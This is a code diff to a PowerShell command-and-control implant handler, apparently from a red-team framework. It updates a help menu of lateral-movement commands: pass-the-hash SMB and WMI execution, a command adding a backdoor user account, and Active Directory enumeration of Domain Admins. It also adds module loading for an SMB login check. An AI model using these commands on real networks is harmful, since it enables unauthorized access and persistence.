@@ -169,10 +169,9 @@ function Implant-Handler
         write-host "==================" -ForegroundColor Red
         write-host " Get-ExternalIP" -ForegroundColor Green
         write-host " Test-ADCredential -Domain test -User ben -Password Password1" -ForegroundColor Green 
-        write-host " Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0" -ForegroundColor Green
-        write-host " Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Password 52F1D3EE92F0" -ForegroundColor Green
-        write-host " Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command `"net user SMBExec Winter2017 /add`"" -ForegroundColor Green
-        write-host " Invoke-WMIExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command `"net user SMBExec Winter2017 /add`"" -ForegroundColor Green
+        write-host " Invoke-SMBLogin -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash/-Password" -ForegroundColor Green
+        write-host " Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash/-Pass -Command `"net user SMBExec Winter2017 /add`"" -ForegroundColor Green
+        write-host " Invoke-WMIExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash/-Pass -Command `"net user SMBExec Winter2017 /add`"" -ForegroundColor Green
         write-host " Net View | Net Users | Whoami /groups | Net localgroup administrators | Net Accounts /dom" -ForegroundColor Green  
         write-host ' Get-NetUser -Filter "(userprincipalname=*@testdomain.com)" | Select-Object samaccountname,userprincipalname' -ForegroundColor Green 
         write-host ' Get-NetGroup -GroupName "Domain Admins" | %{ Get-NetUser $_.membername } | %{ $a=$_.displayname.split(" ")[0..1] -join " "; Get-NetUser -Filter "(displayname=*$a*)" } | Select-Object -Property displayname,samaccountname' -ForegroundColor Green 
@@ -904,6 +903,10 @@ param
                 CheckModuleLoaded "Inveigh.ps1" $psrandomuri
             }
             if ($pscommand.ToLower().StartsWith('invoke-smbexec'))
+            { 
+                CheckModuleLoaded "Invoke-SMBExec.ps1" $psrandomuri
+            }
+            if ($pscommand.ToLower().StartsWith('invoke-smblogin'))
             { 
                 CheckModuleLoaded "Invoke-SMBExec.ps1" $psrandomuri
             }
